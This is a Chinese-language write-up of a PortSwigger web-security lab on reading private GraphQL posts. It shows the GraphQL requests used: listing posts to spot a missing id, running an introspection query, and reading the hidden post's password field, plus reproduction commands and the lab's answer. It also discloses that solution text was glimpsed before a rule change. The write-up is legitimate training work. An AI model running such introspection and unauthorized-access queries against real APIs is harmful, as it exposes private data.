---
title: "lab-graphql-reading-private-posts"
links:
  - target: graphql-family
    relation: evidences
---

# lab-graphql-reading-private-posts

> evidences: [[graphql-family]]

- 题面:Accessing private GraphQL posts(/web-security/graphql/lab-graphql-reading-private-posts)
- 实例:https://0aae0063047c1b3b80b780e4000d0045.web-security-academy.net
- 判定目标:找到隐藏博文,读取并提交其口令(题页有 submitSolution)

## 关键步

1. 端点:`POST /graphql/v1` 有效;`GET /graphql/v1?...` → 405(仅 POST)。
2. 列表面 JS(`blogSummaryGql.js`):`getAllBlogPosts{image title summary id}`;查询 → 公开 id 1、2、4、5,**缺 3**。
3. 详情面 JS(`blogPostGql.js`):`getBlogPost($id: Int!){image title author date paragraphs}`(UI 不请求 summary/postPassword)。
4. introspection:`{"query":"{__schema{types{name fields{name}}}}"}` → `BlogPost` 字段含 `isPrivate`、`postPassword`(UI 未用)。
5. 越权读私有:`getBlogPost(id:3){id title isPrivate postPassword}` → `isPrivate:true`,`postPassword` 明文。
6. 交卷面(`submitSolution.js`):`POST /submitSolution`,体 `answer=<口令>` → `{"correct":true}`。

## 交册值

私有博文 id=3 的口令 = `a3r1l6eleyof92gxryhlj292iapgru67`。

## 证据摘录

```
POST /graphql/v1  {"query":"query{getAllBlogPosts{id title}}"} -> ids [2,4,1,5](无 3)
POST /graphql/v1  {"query":"{__schema{types{name fields{name}}}}"} -> BlogPost[... isPrivate, postPassword]
POST /graphql/v1  {"query":"query{getBlogPost(id:3){id title isPrivate postPassword}}"}
   -> {"data":{"getBlogPost":{"id":3,"title":"Watching Me, Watching You.","isPrivate":true,
        "postPassword":"a3r1l6eleyof92gxryhlj292iapgru67"}}}
POST /submitSolution  answer=a3r1l6eleyof92gxryhlj292iapgru67 -> {"correct":true}
solved_check / -> {"solved":true,"congrats_line":"<h4>Congratulations, you solved the lab!</h4>"}
```

## 复现命令

```
lab_page "https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts" --out /tmp/g3-page-stripped.html   # 剥离 solution,回 lab_id
lab_launch launch <lab_id> --widget-source /web-security/graphql/lab-graphql-reading-private-posts --jar /tmp/mar-jar.json
lab_http post "<inst>/graphql/v1" --header 'Content-Type: application/json' \
  --body '{"query":"query{getAllBlogPosts{id title}}"}'
lab_http post "<inst>/graphql/v1" --header 'Content-Type: application/json' \
  --body '{"query":"{__schema{types{name fields{name}}}}"}' --out /tmp/g3-schema.json
json_pick /tmp/g3-schema.json '.data.__schema.types[] | select(.name=="BlogPost") | .fields[].name'   # -> isPrivate / postPassword (手术刀)
lab_http post "<inst>/graphql/v1" --header 'Content-Type: application/json' \
  --body '{"query":"query{getBlogPost(id:3){id title isPrivate postPassword}}"}'
lab_http post "<inst>/submitSolution" --form answer=<pw> --jar /tmp/mar-jar.json
solved_check "<inst>/" --jar /tmp/mar-jar.json
```

## 独立性如实标注

规则更正(禁读题解)前,抓页/摘要步骤读到了题页 solution 片段(含「id 变量改为 3」)。`postPassword` 字段由自行 introspection 得出、id=3 亦由列表缺口独立推出,题解文本非必需,但不能排除受其影响。
